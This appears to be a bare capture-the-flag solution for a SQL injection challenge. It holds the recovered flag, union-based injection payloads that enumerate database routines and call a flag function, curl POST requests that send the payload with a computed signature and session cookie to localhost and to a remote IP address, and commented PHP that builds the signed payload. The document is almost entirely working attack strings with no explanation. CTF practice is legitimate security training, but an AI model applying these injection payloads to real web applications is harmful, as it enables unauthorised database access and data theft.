```
lastctf{sql1nj3ct10n_ju5t_f0r_fun}
select give_me_flag()
```
```
index.php?id=1' and 1=0 union select 1,group_concat(routine_name),3 from information_schema.routines limit 1-- -
index.php?id=1' and 1=0 union select 1,give_me_flag(),3-- -
index.php?id=1' and 1=0 union select 1,unhex(give_me_flag()),3-- -
```

```
curl --location --request POST 'http://localhost:9001/index.php' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--header 'Cookie: PHPSESSID=kqnvo31c64cv31au60j5ue0roi' \
--data-urlencode 'id=1'\'' and 1=0 union select 1,unhex(give_me_flag()),3-- -' \
--data-urlencode 'signature=aa19692af698f69ff0fe4c40472c394870779dc0'
```

```
//$payload1 =  "1' and 1=0 union select 1,group_concat(routine_name),3 from information_schema.routines limit 1-- -";
//$payload2 =  "1' and 1=0 union select 1,unhex(give_me_flag()),3-- -";
//highlight_string("index.php?id=$payload2&signature=".generate_signature($payload2));
```

```
curl --location --request POST 'http://103.147.32.214:10002/index.php' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--header 'Cookie: PHPSESSID=d44ejm41b8ddue99i2g2s4fm6t' \
--data-urlencode 'id=1'\'' and 1=0 union select 1,unhex(give_me_flag()),3-- -' \
--data-urlencode 'signature=30cd292b7d2a1f2c30c5dea82b5d6d0dfdc662a6'
```